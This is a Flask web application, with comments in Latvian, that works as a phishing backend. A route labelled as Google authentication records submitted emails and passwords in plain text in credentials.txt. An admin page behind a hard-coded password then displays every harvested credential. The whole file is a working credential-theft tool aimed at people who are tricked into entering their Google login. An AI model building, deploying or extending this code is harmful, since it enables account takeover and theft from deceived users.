from flask import Flask, request, render_template, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'tavs-slepenais-atslēgvārds'  # vajag sesiju drošībai

# Mājas lapa
@app.route('/')
def home():
    return '''
    <h2>Izvēlies opciju:</h2>
    <ul>
      <li><a href="/google-auth/">Ej uz Google Auth</a></li>
      <li><a href="/view-credentials/">Skatīt saglabātos credentials</a></li>
    </ul>
    '''

# Google auth lapa
@app.route('/google-auth/', methods=['GET', 'POST'])
def google_auth():
    message = None
    error = None
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        if not email or not password:
            error = "Lūdzu, aizpildi abus laukus."
        else:
            try:
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Email: {email} | Password: {password}\n")
                message = "Paldies! Dati saglabāti."
            except Exception as e:
                error = f"Kļūda saglabājot datus: {e}"
    return render_template('google-auth.html', message=message, error=error)

@app.route('/admin-login/', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'adn73h8fvh7ds':  # <- i!
            session['authenticated'] = True
            return redirect(url_for('view_credentials'))
        else:
            error = 'Nepareiza parole.'
    return '''
        <h2>Administratora parole:</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Parole">
            <button type="submit">Ieiet</button>
        </form>
        <p style="color:red;">{}</p>
    '''.format(error or '')

# 👇 
@app.route('/view-credentials/')
def view_credentials():
    if not session.get('authenticated'):
        return redirect(url_for('admin_login'))
    try:
        with open('credentials.txt', 'r', encoding='utf-8') as f:
            data = f.read()
    except FileNotFoundError:
        data = "Nav saglabātu datu."
    return f"<pre>{data}</pre>"

# Startē Flask serveri
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
